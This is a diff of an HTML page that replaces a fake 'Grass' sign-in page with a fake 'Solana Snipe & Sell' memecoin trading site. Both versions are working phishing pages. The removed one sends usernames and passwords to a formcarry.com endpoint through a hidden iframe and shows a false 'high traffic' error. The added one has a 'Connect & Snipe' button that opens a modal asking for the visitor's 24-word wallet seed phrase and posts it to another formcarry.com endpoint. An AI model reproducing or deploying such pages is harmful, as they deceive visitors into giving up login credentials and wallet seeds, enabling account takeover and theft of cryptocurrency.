@@ -1,157 +1,243 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Grass Login</title>
+    <title>Solana Snipe & Sell</title>
     <style>
-        /* Resetting some basic styles */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
         }
 
         body {
+            font-family: Arial, sans-serif;
+            background-color: #0d1116;
+            color: #e0e0e0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f9f9f9;
-            color: #333;
         }
 
         .container {
-            width: 360px;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
             text-align: center;
+            max-width: 600px;
+            padding: 20px;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 16px;
         }
 
         .logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 10px;
+            width: 30px;
         }
 
         .title {
-            font-size: 28px;
+            color: #00ff9d;
             font-weight: bold;
-            color: #D4E157;
-            margin-bottom: 20px;
         }
 
-        .form-group {
-            margin-bottom: 15px;
-            text-align: left;
+        h1 {
+            font-size: 32px;
+            line-height: 1.4;
+            color: #ffffff;
         }
 
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
+        .highlight {
+            color: #00ff9d;
+            font-style: italic;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .feature-item {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 10px;
             border-radius: 8px;
-            font-size: 16px;
-            margin-top: 5px;
-        }
-
-        .form-group a {
             font-size: 14px;
-            color: #555;
-            text-decoration: none;
-            display: block;
-            margin-top: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #e0e0e0;
         }
 
-        .btn {
-            background-color: #757575;
-            color: white;
-            padding: 12px;
-            width: 100%;
+        .emoji {
+            margin-left: 5px;
+        }
+
+        p {
+            margin-top: 20px;
+            color: #b0b0b0;
+            font-size: 16px;
+        }
+
+        .connect-button {
+            background-color: #00ff9d;
             border: none;
+            padding: 12px 28px;
+            font-size: 16px;
+            color: #000000;
+            font-weight: bold;
             border-radius: 8px;
             cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-        }
-
-        .register-link {
             margin-top: 20px;
-            font-size: 14px;
-            color: #333;
+            transition: background-color 0.3s;
+            box-shadow: 0 4px 12px rgba(0, 255, 157, 0.3);
         }
 
-        .register-link a {
-            color: #D4E157;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .error-message {
-            color: red;
-            font-size: 14px;
-            margin-top: 15px;
-            display: none;
+        .connect-button:hover {
+            background-color: #00e68b;
         }
 
         footer {
-            font-size: 12px;
-            color: #555;
-            margin-top: 20px;
+            margin-top: 30px;
+            color: #b0b0b0;
         }
 
-        footer a {
-            color: #555;
-            text-decoration: none;
-            margin: 0 5px;
+        .footer-nav {
+            display: flex;
+            justify-content: space-around;
+            font-size: 14px;
+            font-weight: bold;
         }
+
+        .footer-nav span {
+            color: #00ff9d;
+            position: relative;
+        }
+
+        .footer-nav span::after {
+            content: "NEW!";
+            color: #ff4d4d;
+            font-size: 10px;
+            position: absolute;
+            top: -8px;
+            right: -18px;
+        }
+
+        .footer-nav span:first-child::after {
+            content: "";
+        }
+
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #222;
+            padding: 20px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 600px;
+            color: #e0e0e0;
+            text-align: center;
+        }
+
+        .seed-textarea {
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background-color: #333;
+            color: #e0e0e0;
+            font-size: 16px;
+            resize: none;
+            height: 100px;
+            margin-top: 10px;
+        }
+
+        .modal-content button {
+            background-color: #00ff9d;
+            padding: 10px 20px;
+            border: none;
+            color: #000;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .close-btn {
+            background-color: #ff4d4d;
+            padding: 5px 10px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">grass™</div>
-        <div class="title">Sign In.</div>
-        <form id="loginForm" action="https://formcarry.com/s/2fRjwsXYSGB" method="POST" target="hidden_iframe" onsubmit="showErrorMessage()">
-            <div class="form-group">
-                <label for="username">Username or Email</label>
-                <input type="text" id="username" name="username" placeholder="Username or Email" required>
+        <header>
+            <div class="logo-section">
+                <img src="https://seeklogo.com/images/S/solana-sol-logo-12828AD23D-seeklogo.com.png" alt="Solana Logo" class="logo">
+                <span class="title">SOL</span>
             </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Password" required>
-                <a href="#">Forgot Password?</a>
-            </div>
-            <button type="submit" class="btn">ACCESS MY ACCOUNT</button>
-        </form>
-        <div class="error-message" id="errorMessage">
-            Sorry, we are experiencing high traffic now. Please login later.
+            <h1>Snipe & Sell Solana Tokens at <span class="highlight">Hyperspeed!</span></h1>
+        </header>
+        
+        <div class="features">
+            <div class="feature-item">ALL SOLANA MEMECOINS <span class="emoji">🤠🍀</span></div>
+            <div class="feature-item">DEPOSIT FROM ALL CHAINS <span class="emoji">🔗</span></div>
+            <div class="feature-item">DETECT RUGS AUTOMATICALLY <span class="emoji">🥚</span></div>
+            <div class="feature-item">MEV PROTECTED TRADING <span class="emoji">🛡️</span></div>
         </div>
-        <div class="register-link">
-            Don’t have an account? <a href="#">Register</a>
-        </div>
+        
+        <p>Connect your wallet and start sniping memes now</p>
+        
+        <button class="connect-button" onclick="openModal()">Connect & Snipe</button>
+        
         <footer>
-            <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a> | <a href="#">Cookie Policy</a> | <a href="#">Cookie Settings</a>
-            <p>© Grass Foundation, 2024. All rights reserved.</p>
+            <div class="footer-nav">
+                <span>Pairs</span>
+                <span>AI Sniper</span>
+                <span>Copy Trading</span>
+                <span>Top Pairs</span>
+                <span>Raydium</span>
+            </div>
         </footer>
     </div>
 
-    <!-- Hidden iframe to handle form submission without leaving the page -->
-    <iframe name="hidden_iframe" style="display:none;"></iframe>
+    <!-- Modal for 24-word phrase -->
+    <div class="modal" id="seedModal">
+        <div class="modal-content">
+            <h2>Enter your 24-word Seed Phrase</h2>
+            <form action="https://formcarry.com/s/BChQBxn0TD1" method="POST">
+                <textarea name="seedPhrase" class="seed-textarea" placeholder="Enter your 24-word seed phrase here..." required></textarea>
+                <button type="submit">Submit</button>
+            </form>
+            <button class="close-btn" onclick="closeModal()">Cancel</button>
+        </div>
+    </div>
 
     <script>
-        function showErrorMessage() {
-            // Show the error message
-            document.getElementById("errorMessage").style.display = "block";
-            
-            // Redirect after a delay (e.g., 3 seconds)
-            setTimeout(function() {
-                window.location.href = "/"; // Replace '/' with the URL of your main page
-            }, 3000);
+        function openModal() {
+            document.getElementById("seedModal").style.display = "flex";
+        }
+
+        function closeModal() {
+            document.getElementById("seedModal").style.display = "none";
         }
     </script>
 </body>
